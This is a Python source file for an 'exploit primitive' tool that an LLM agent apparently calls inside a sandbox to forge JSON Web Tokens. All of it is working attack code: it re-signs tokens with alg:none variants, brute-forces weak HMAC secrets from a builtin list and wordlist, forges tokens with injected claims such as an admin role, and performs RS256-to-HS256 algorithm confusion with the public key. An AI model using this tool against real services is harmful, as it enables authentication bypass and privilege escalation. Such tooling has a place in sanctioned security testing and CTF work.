"""JWT forge — an executable exploit PRIMITIVE (same shape as solver._blind_extract).

One tool call runs every common JWT-auth-bypass attack in-sandbox instead of the LLM
hand-assembling base64url + HMAC by hand (it always fumbles the padding):
  1. alg:none family  — re-sign with alg none/None/NONE/nOnE and an empty signature.
  2. weak HMAC secret  — crack HS256/384/512 against a builtin list + optional wordlist,
                         then forge a token with the caller's claim overrides.
  3. alg-confusion     — RS256->HS256: HMAC the token with the RSA PUBLIC KEY as the secret.

Pure-stdlib crypto (hmac/hashlib), so it runs anywhere python3 does. Returns each forged
token labelled by method and reports which secret cracked.
"""
import base64
import json


def _script(params: dict) -> str:
    """The primitive as a self-contained stdlib script run inside the sandbox."""
    return "import json,sys,hmac,hashlib,os\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
def b64d(s):                       # base64url decode, tolerate missing padding
    s=s.encode() if isinstance(s,str) else s
    return base64.urlsafe_b64decode(s+b"="*(-len(s)%4))
import base64
def b64e(b):                       # base64url encode, strip padding
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

TOK=P["token"].strip()
CLAIMS=P.get("claims") or {}
parts=TOK.split(".")
if len(parts)<2:
    print("JWT_FORGE_FAIL: not a JWT (need header.payload.signature): %r"%TOK[:40]); sys.exit(0)
try:
    header=json.loads(b64d(parts[0]))
    payload=json.loads(b64d(parts[1]))
except Exception as e:
    print("JWT_FORGE_FAIL: could not parse header/payload: %s"%e); sys.exit(0)

def forge_payload():
    p=dict(payload); p.update(CLAIMS); return p

alg=str(header.get("alg","")); print("JWT_FORGE_OK parsed alg=%s claims_override=%s"%(alg,json.dumps(CLAIMS)))

# 1. alg:none family — no signature to compute; empty third segment
for a in ("none","None","NONE","nOnE"):
    h=dict(header); h["alg"]=a
    t=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))+"."
    print("[alg-none/%s] %s"%(a,t))

# 2. weak HMAC secret — crack, then forge
_HASH={"HS256":hashlib.sha256,"HS384":hashlib.sha384,"HS512":hashlib.sha512}
def sign_hs(alg,secret,signing_input):
    return b64e(hmac.new(secret if isinstance(secret,bytes) else secret.encode(),
                         signing_input.encode(),_HASH[alg]).digest())

if alg in _HASH and len(parts)==3:
    cands=[("secret","builtin"),("secret123","builtin"),("password","builtin"),
           ("admin","builtin"),("key","builtin"),("changeme","builtin"),("jwt","builtin"),
           ("s3cr3t","builtin"),("your-256-bit-secret","builtin")]
    wl=P.get("wordlist")
    if wl and os.path.exists(wl):
        try:
            with open(wl,"rb") as f:
                for line in f:
                    w=line.rstrip(b"\r\n").decode("utf-8","replace")
                    if w: cands.append((w,"wordlist"))
        except Exception as e:
            print("[hmac-crack] wordlist read error: %s"%e)
    signing_input=parts[0]+"."+parts[1]; want=parts[2]
    found=None
    for sec,src in cands:
        if hmac.compare_digest(sign_hs(alg,sec,signing_input),want):
            found=(sec,src); break
    if found:
        sec,src=found; print("[hmac-crack] SECRET FOUND: %r (%s)"%(sec,src))
        h=dict(header); h["alg"]=alg
        si=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))
        print("[hmac-forge/%s] %s.%s"%(alg,si,sign_hs(alg,sec,si)))
    else:
        print("[hmac-crack] no secret in builtin list (%d)%s cracked the signature"%(
            len(cands)," + wordlist" if wl else ""))
elif alg.startswith("HS"):
    print("[hmac-crack] unsupported HMAC alg %s (only HS256/384/512)"%alg)

# 3. alg-confusion RS256->HS256 — HMAC with the RSA PUBLIC KEY bytes as the secret
pk=P.get("public_key")
if pk:
    key=None
    if os.path.exists(pk):
        try: key=open(pk,"rb").read()
        except Exception as e: print("[alg-confusion] public_key file read error: %s"%e)
    else:
        key=pk.encode()
    if key is not None:
        h=dict(header); h["alg"]="HS256"
        si=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))
        sig=b64e(hmac.new(key,si.encode(),hashlib.sha256).digest())
        print("[alg-confusion RS256->HS256] %s.%s"%(si,sig))
'''


def run(sb, args: dict) -> str:
    """Validate args, run the primitive script in the sandbox, return its output."""
    token = args.get("token")
    if not token or not isinstance(token, str):
        return "jwt_forge error: 'token' is required — the JWT to forge from (header.payload.sig)."
    claims = args.get("claims") or {}
    if not isinstance(claims, dict):
        return ("jwt_forge error: 'claims' must be a dict of claim overrides, e.g. "
                "{'role':'admin','sub':'1'}.")
    params = {"token": token, "claims": claims}
    if args.get("wordlist"):
        params["wordlist"] = args["wordlist"]
    if args.get("public_key"):
        params["public_key"] = args["public_key"]
    b64 = base64.b64encode(_script(params).encode()).decode()
    return sb.bash(f"echo {b64} | base64 -d | python3 -")
